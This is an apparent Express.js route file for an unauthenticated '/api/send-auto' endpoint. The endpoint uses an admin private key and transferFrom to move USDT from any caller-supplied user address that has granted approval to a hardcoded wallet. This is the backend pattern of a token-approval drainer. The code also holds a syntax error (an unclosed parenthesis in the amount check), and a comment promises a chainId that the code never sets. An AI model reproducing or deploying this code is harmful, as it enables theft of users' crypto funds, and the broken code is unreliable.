// server.js or routes.js
require('dotenv').config(); // Ensure this is at the top if using .env
const ethers = require('ethers');

app.post("/api/send-auto", async (req, res) => {
    // 1. Add input validation
    if (!req.body.userAddress || !req.body.amount) {
        return res.status(400).json({ 
            success: false, 
            error: "Missing required parameters: userAddress and amount" 
        });
    }

    const { userAddress, amount } = req.body;

    try {
        // 2. Validate Ethereum address
        if (!ethers.isAddress(userAddress)) {
            return res.status(400).json({ 
                success: false, 
                error: "Invalid user address format" 
            });
        }

        // 3. Validate amount
        if (isNaN(amount) {
            return res.status(400).json({ 
                success: false, 
                error: "Amount must be a number" 
            });
        }

        // 4. Check environment variables
        if (!process.env.RPC_URL || !process.env.ADMIN_PRIVATE_KEY || !process.env.USDT_ADDRESS_BEP) {
            console.error("Missing environment variables");
            return res.status(500).json({ 
                success: false, 
                error: "Server configuration error" 
            });
        }

        // 5. Initialize provider with timeout
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
        provider._getConnection().timeout = 10000; // 10 second timeout

        // 6. Initialize wallet with explicit chainId for BSC (56)
        const adminWallet = new ethers.Wallet(
            process.env.ADMIN_PRIVATE_KEY, 
            provider
        );

        // 7. Initialize contract with error handling
        const USDT = new ethers.Contract(
            process.env.USDT_ADDRESS_BEP, 
            [
                "function transferFrom(address from, address to, uint256 value) public returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)"
            ], 
            adminWallet
        );

        const toWallet = "0xE4B07524A375f4Aa0905F02D33D88f60b1eD292c";
        const amountInWei = ethers.parseUnits(amount.toString(), 18);

        // 8. Check allowance first
        const allowance = await USDT.allowance(userAddress, adminWallet.address);
        if (allowance < amountInWei) {
            return res.status(400).json({ 
                success: false, 
                error: "Insufficient allowance. Please approve first." 
            });
        }

        // 9. Send transaction with proper gas estimation
        const tx = await USDT.transferFrom(userAddress, toWallet, amountInWei, {
            gasLimit: 100000 // Explicit gas limit for BEP-20
        });

        // 10. Wait for transaction with timeout
        const receipt = await Promise.race([
            tx.wait(),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error("Transaction timeout")), 30000)
            )
        ]);

        // 11. Verify transaction was successful
        if (receipt.status !== 1) {
            throw new Error("Transaction failed on-chain");
        }

        res.json({ 
            success: true, 
            txHash: tx.hash,
            explorerUrl: `https://bscscan.com/tx/${tx.hash}`
        });

    } catch (err) {
        console.error("Transfer error:", err);
        
        // 12. More specific error handling
        let errorMessage = err.message;
        if (err.code === 'INSUFFICIENT_FUNDS') {
            errorMessage = "Insufficient funds for gas";
        } else if (err.code === 'NETWORK_ERROR') {
            errorMessage = "Network connection failed";
        } else if (err.message.includes("timeout")) {
            errorMessage = "Transaction timed out";
        }

        res.status(500).json({ 
            success: false, 
            error: errorMessage,
            details: process.env.NODE_ENV === 'development' ? err.stack : undefined
        });
    }
});